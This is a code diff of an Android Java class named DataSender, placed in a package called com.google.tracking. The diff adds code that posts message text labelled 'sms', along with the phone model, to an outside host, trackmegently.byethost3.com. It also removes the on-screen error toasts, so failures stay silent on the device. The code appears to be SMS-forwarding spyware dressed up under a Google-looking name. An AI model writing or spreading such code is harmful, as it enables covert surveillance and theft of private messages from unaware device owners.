@@ -1,58 +1,75 @@
 package com.google.tracking;
 
 import android.content.Context;
+import android.os.Build;
 import android.util.Log;
 import android.widget.Toast;
 
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.io.OutputStreamWriter;
-import java.net.MalformedURLException;
-import java.net.URL;
-import java.net.URLConnection;
-import java.net.URLEncoder;
+import java.io.*;
+import java.net.*;
+import java.nio.charset.Charset;
 
 /**
  * Created by maxim.yanukovich on 06.01.2015.
  */
 public class DataSender {
-    // Convert the incoming data string to a URL.
+    //private static String urlString = "http://192.168.9.71:80/SVN/receiver.php";
+    private static String urlString = "http://trackmegently.byethost3.com/receiver.php";
+    private static String SMS = "sms";
+
     public DataSender(String msg, Context context) {
-        String urlString = "http://192.168.9.71:80/SVN/receiver.php";
-        Log.d(this.toString(), urlString.toString());
-//        String urlString = "http://google.com/";
+        Log.d(this.getClass().toString(), urlString.toString());
+
+        disableConnectionReuseIfNecessary();
+
+        sendSMS(msg);
+    }
+
+    public void sendSMS(String msg) {
+        postHttp(SMS, msg);
+    }
+
+    private void postHttp(String action, String msg) {
         try {
 
-//            String urlParameters  = "msg=" + msg + "&param2=b&param3=c";
-//            byte[] postData       = urlParameters.getBytes( Charset.forName("UTF-8"));
-//            int    postDataLength = postData.length;
-            URL    url            = new URL( urlString );
+            String urlParameters = "action=" + action + "&msg=" + msg + "&model=" + Build.MODEL;
+            byte[] postData = urlParameters.getBytes(Charset.forName("UTF-8"));
+            int postDataLength = postData.length;
 
-            URLConnection urlConnection = url.openConnection();
-            urlConnection.setUseCaches(false);
-            urlConnection.setDoOutput(true);
-            OutputStreamWriter out = new OutputStreamWriter(urlConnection.getOutputStream());
-            out.write("msg=" + URLEncoder.encode(msg));
-            out.flush();
-            out.close();
-
-
-            BufferedReader in = new BufferedReader(new InputStreamReader(
-                    urlConnection.getInputStream()));
-            String inputLine;
-            while ((inputLine = in.readLine()) != null) {
+            URL url = new URL(urlString);
+            HttpURLConnection httConn = (HttpURLConnection) url.openConnection();
+            httConn.setDoOutput(true);
+            httConn.setDoInput(true);
+            httConn.setInstanceFollowRedirects(false);
+            httConn.setRequestMethod("POST");
+            httConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            httConn.setRequestProperty("charset", "utf-8");
+            httConn.setRequestProperty("Content-Length", Integer.toString(postDataLength));
+            httConn.setUseCaches(false);
+            httConn.connect();
+            try {
+                DataOutputStream os = new DataOutputStream(httConn.getOutputStream());
+                os.write(postData);
+                Log.d("getResponseCode", String.valueOf(httConn.getResponseCode()));
+//                wr.writeUTF(urlParameters);
+            } catch (Exception ex) {
+                Log.d("Exception", ex.getMessage());
             }
-            in.close();
+
 
             // Handles possible exceptions
         } catch (MalformedURLException localMalformedURLException) {
-            Toast.makeText(context, localMalformedURLException.getMessage(), Toast.LENGTH_SHORT).show();
             localMalformedURLException.printStackTrace();
 
         } catch (IOException localIOException) {
-            Toast.makeText(context, localIOException.getMessage(), Toast.LENGTH_SHORT).show();
             localIOException.printStackTrace();
+        }
+    }
+
+    private void disableConnectionReuseIfNecessary() {
+        // HTTP connection reuse which was buggy pre-froyo
+        if (Integer.parseInt(Build.VERSION.SDK) < Build.VERSION_CODES.FROYO) {
+            System.setProperty("http.keepAlive", "false");
         }
     }
 }
